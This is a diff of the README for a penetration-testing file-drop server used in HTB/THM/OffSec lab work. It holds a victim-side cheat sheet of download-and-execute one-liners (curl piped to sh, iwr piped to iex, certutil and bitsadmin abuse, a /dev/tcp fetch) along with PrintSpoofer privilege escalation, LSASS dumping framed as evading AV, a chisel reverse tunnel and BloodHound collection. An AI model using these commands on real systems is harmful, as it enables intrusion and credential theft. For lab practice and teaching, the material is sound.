@@ -11,7 +11,7 @@ Two scripts do all the work:
 | Script   | Purpose                                                                     |
 |----------|-----------------------------------------------------------------------------|
 | `fetch.sh` | Downloads every tool from its official upstream into the right folder      |
-| `neoserv.sh` *(alias: `neoserv`)* | Starts an HTTP server on `tun0:1337` so victims can pull files |
+| `neoserv.sh` *(alias: `neoserv`)* | Starts an HTTP server on `tun0:80` (auto-`sudo`) so victims can pull files |
 
 ---
 
@@ -67,7 +67,7 @@ Disk: ~200 MB after `fetch.sh` runs. Bandwidth: ~190 MB initial download from Gi
 Drop it wherever you keep your tooling:
 
 ```bash
-git clone https://github.com/neosprings/neoserv.git
+git clone https://github.com/Neosprings/neoserv.git
 cd neoserv
 ```
 
@@ -107,13 +107,10 @@ export PATH="$HOME/.local/bin:$PATH"
 # 1. Connect to your lab VPN first
 sudo openvpn ~/Downloads/lab_user.ovpn
 
-# 2. Confirm tun0 is up and you have an IP
-ip -4 addr show tun0
-
-# 3. Start the drop server (default port 1337)
+# 2. Start the drop server (default port 80, auto-elevates with sudo)
 neoserv
 # or:  ./neoserv.sh
-# or with custom port: neoserv 8080
+# or with a custom port: neoserv 1337
 ```
 
 You'll see something like:
@@ -126,39 +123,59 @@ You'll see something like:
    HTB / THM / OffSec / HS Drop Server — by Chris Alupului (Neospring)
 
 [*] serving /path/to/neoserv
-[*] http://10.10.14.42:1337/
+[*] http://10.10.14.42/   (flat URLs work, e.g. http://10.10.14.42/linpeas.sh)
 
-  Linux:    curl http://10.10.14.42:1337/linux/linpeas.sh | sh
-  PS:       iwr http://10.10.14.42:1337/windows/winPEASx64.exe -o w.exe; .\w.exe
-  certutil: certutil -urlcache -f http://10.10.14.42:1337/shells/nc64.exe nc.exe
+  Linux:    curl http://10.10.14.42/linpeas.sh | sh
+  PS:       iwr http://10.10.14.42/winPEASx64.exe -o w.exe; .\w.exe
+  certutil: certutil -urlcache -f http://10.10.14.42/nc64.exe nc.exe
 ```
 
 The IP shown is your `tun0` address. Paste those one-liners directly into the victim shell.
 
 `Ctrl-C` to stop. The server only binds to `tun0`, so it's not reachable from the internet or your LAN.
 
+### Skipping the sudo prompt for port 80
+
+Linux requires root to bind any port below 1024, so `neoserv` (default port 80) auto-elevates with `sudo` and prompts for your password the first time per session. Three ways to avoid the prompt:
+
+| Option | Command | Effect |
+|---|---|---|
+| **Use a non-privileged port** | `neoserv 1337` | No sudo at all. URLs become `http://$IP:1337/…` |
+| **Passwordless sudo for this script only** *(recommended if you want port 80)* | see below | `neoserv` still runs port 80, no prompt |
+| **`setcap` on the PHP binary** | `sudo setcap CAP_NET_BIND_SERVICE+ep $(which php)` | Any PHP server can bind privileged ports forever |
+
+To set up the passwordless sudoers entry (one time):
+
+```bash
+echo "$(whoami) ALL=(root) NOPASSWD: $(readlink -f ~/.local/bin/neoserv)" \
+  | sudo tee /etc/sudoers.d/neoserv
+sudo chmod 440 /etc/sudoers.d/neoserv
+```
+
+After that, `neoserv` runs port 80 with no password prompt.
+
 ---
 
 ## Victim-side fetch cheat sheet
 
-Replace `$IP` with your attacker `tun0` IP and `$PORT` with `1337` (default).
+Replace `$IP` with your attacker `tun0` IP. `neoserv` defaults to **port 80**, so `$IP` alone is enough; no port suffix needed. If you started it on a custom port (e.g. `neoserv 1337`), append `:1337` to the URLs. The router serves any file by basename, so `/linpeas.sh` works just like `/linux/linpeas.sh`.
 
 ### Linux
 
 ```bash
 # Run linpeas in memory, no disk write
-curl http://$IP:$PORT/linux/linpeas.sh | sh
+curl http://$IP/linpeas.sh | sh
 
 # Download + execute pspy (process snooper)
-curl -o /tmp/pspy http://$IP:$PORT/linux/pspy64
+curl -o /tmp/pspy http://$IP/pspy64
 chmod +x /tmp/pspy && /tmp/pspy
 
 # wget alternative (busybox boxes)
-wget -q http://$IP:$PORT/linux/lse.sh -O /tmp/lse.sh && bash /tmp/lse.sh
+wget -q http://$IP/lse.sh -O /tmp/lse.sh && bash /tmp/lse.sh
 
 # Pure-bash /dev/tcp fallback when curl/wget are missing
-exec 3<>/dev/tcp/$IP/$PORT
-echo -e "GET /linux/linpeas.sh HTTP/1.0\r\n\r\n" >&3
+exec 3<>/dev/tcp/$IP/80
+echo -e "GET /linpeas.sh HTTP/1.0\r\n\r\n" >&3
 cat <&3
 ```
 
@@ -166,13 +183,13 @@ cat <&3
 
 ```powershell
 # Download to disk and execute
-iwr http://$IP:$PORT/windows/winPEASx64.exe -o w.exe; .\w.exe
+iwr http://$IP/winPEASx64.exe -o w.exe; .\w.exe
 
 # Reflective: PrivescCheck loaded directly into memory
-iwr http://$IP:$PORT/windows/PrivescCheck.ps1 -UseBasicParsing | iex
+iwr http://$IP/PrivescCheck.ps1 -UseBasicParsing | iex
 
 # Older PS (no iwr)
-(New-Object Net.WebClient).DownloadFile("http://$IP:$PORT/windows/winPEASx64.exe","$env:TEMP\w.exe")
+(New-Object Net.WebClient).DownloadFile("http://$IP/winPEASx64.exe","$env:TEMP\w.exe")
 & "$env:TEMP\w.exe"
 ```
 
@@ -180,10 +197,10 @@ iwr http://$IP:$PORT/windows/PrivescCheck.ps1 -UseBasicParsing | iex
 
 ```cmd
 :: Available on every Windows since XP. Abuses the cert cache as a file fetcher
-certutil -urlcache -f http://%IP%:%PORT%/shells/nc64.exe nc.exe
+certutil -urlcache -f http://%IP%/nc64.exe nc.exe
 
 :: bitsadmin (deprecated but still works on most builds)
-bitsadmin /transfer myJob /download /priority normal http://%IP%:%PORT%/sysinternals/procdump64.exe %TEMP%\pd.exe
+bitsadmin /transfer myJob /download /priority normal http://%IP%/procdump64.exe %TEMP%\pd.exe
 ```
 
 ---
@@ -211,7 +228,7 @@ Run `neoserv` (or `eza -R --icons=always` from inside the repo) for the full fil
 ### "I just got a Linux shell, what do I run?"
 
 ```bash
-curl http://$IP:1337/linux/linpeas.sh | sh
+curl http://$IP/linpeas.sh | sh
 ```
 
 If linpeas finds a kernel exploit candidate, grab the matching PoC from `kernel-exploits/`.
@@ -219,8 +236,8 @@ If linpeas finds a kernel exploit candidate, grab the matching PoC from `kernel-
 ### "I just got a Windows shell, what do I run?"
 
 ```powershell
-iwr http://$IP:1337/windows/winPEASx64.exe -o w.exe; .\w.exe
-iwr http://$IP:1337/windows/PrivescCheck.ps1 -UseBasicParsing | iex
+iwr http://$IP/winPEASx64.exe -o w.exe; .\w.exe
+iwr http://$IP/PrivescCheck.ps1 -UseBasicParsing | iex
 ```
 
 ### "winPEAS says I have SeImpersonatePrivilege"
@@ -234,14 +251,14 @@ You can become SYSTEM. Pick the potato that matches the OS:
 | Older Server / Win        | `JuicyPotatoNG.exe` or `RoguePotato.exe` |
 
 ```powershell
-iwr http://$IP:1337/potatoes/PrintSpoofer64.exe -o p.exe
+iwr http://$IP/PrintSpoofer64.exe -o p.exe
 .\p.exe -i -c "cmd.exe"
 ```
 
 ### "I need to dump LSASS without mimikatz tripping AV"
 
 ```powershell
-iwr http://$IP:1337/sysinternals/procdump64.exe -o pd.exe
+iwr http://$IP/procdump64.exe -o pd.exe
 .\pd.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
@@ -256,7 +273,7 @@ Use chisel for a quick SOCKS proxy back to your attacker:
 ./tunneling/chisel server -p 8000 --reverse
 
 # Victim (linux)
-curl -o /tmp/c http://$IP:1337/tunneling/chisel; chmod +x /tmp/c
+curl -o /tmp/c http://$IP/chisel; chmod +x /tmp/c
 /tmp/c client $IP:8000 R:1080:socks
 ```
 
@@ -266,7 +283,7 @@ Then `proxychains nmap -sT 10.0.0.0/24` from the attacker.
 
 ```powershell
 # Quick BloodHound collection
-iwr http://$IP:1337/ad/SharpHound.exe -o sh.exe
+iwr http://$IP/SharpHound.exe -o sh.exe
 .\sh.exe -c All --zipfilename loot.zip
 ```
 
@@ -279,7 +296,7 @@ Then transfer `loot.zip` back, ingest into BloodHound, find your path.
 | Symptom                                            | Likely cause                          | Fix                                                            |
 |----------------------------------------------------|---------------------------------------|----------------------------------------------------------------|
 | `[!] tun0 not up. Connect to your lab VPN first…`  | VPN isn't active                      | Run your `.ovpn` and confirm `ip a show tun0`                  |
-| `Address already in use`                           | Port 1337 occupied                    | `neoserv 8080` (or `lsof -i :1337` to find culprit)            |
+| `Address already in use`                           | Port 80 occupied (often Apache)       | `sudo systemctl stop apache2`, or run `neoserv 1337`           |
 | Victim says `bash: curl: command not found`        | Minimal busybox / Alpine box          | Try `wget`, then bash `/dev/tcp` fallback above                |
 | PowerShell `iwr` returns garbage / hangs           | Old PS without `-UseBasicParsing`     | Add `-UseBasicParsing` to the cmdlet                           |
 | `cannot be loaded because running scripts is disabled` | Execution policy                  | `powershell -ep bypass -c ".\\script.ps1"`                     |
@@ -358,5 +375,3 @@ None of that is part of this repo's scope.
 Code in this repo (`fetch.sh`, `neoserv.sh`, this README) is released under the **MIT License**.
 
 The tools fetched by `fetch.sh` retain their **own original licenses** held by their respective authors. This repo redistributes nothing. Every file is pulled directly from its upstream source at install time.
-
-Issues, PRs, and additions to the tool list welcome.
